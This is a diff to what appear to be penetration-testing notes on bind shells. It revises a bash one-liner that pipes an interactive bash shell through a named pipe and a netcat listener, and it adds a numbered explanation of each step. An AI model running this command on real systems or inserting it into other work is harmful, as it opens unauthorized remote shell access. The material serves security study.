@@ -43,13 +43,19 @@ To setup a bind shell on the server, we need to define:
 - the directory
 - the shell
 - the listener
-- a pipeline (eg. nc)
+- a pipeline (eg. a named pipe)
 - input & output redirection
 
 **Bash**
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l 1234 >/tmp/f
 ```
+> 1. Remove any existing `/tmp/f`
+> 2. Create a named pipe at `/tmp/f` with `mkfifo`
+> 3. Read input from `/tmp/f` with `cat`
+> 4. Spawn an interactive bash shell with errors being redirected to stdout
+> 5. Start a `nc` listener that writes to `/tmp/f`
+> With this, any commands sent via the nc connection are written and then read from `/tmp/f`, executed and output is returned back down the connection.
 
 **Python**
 ```python
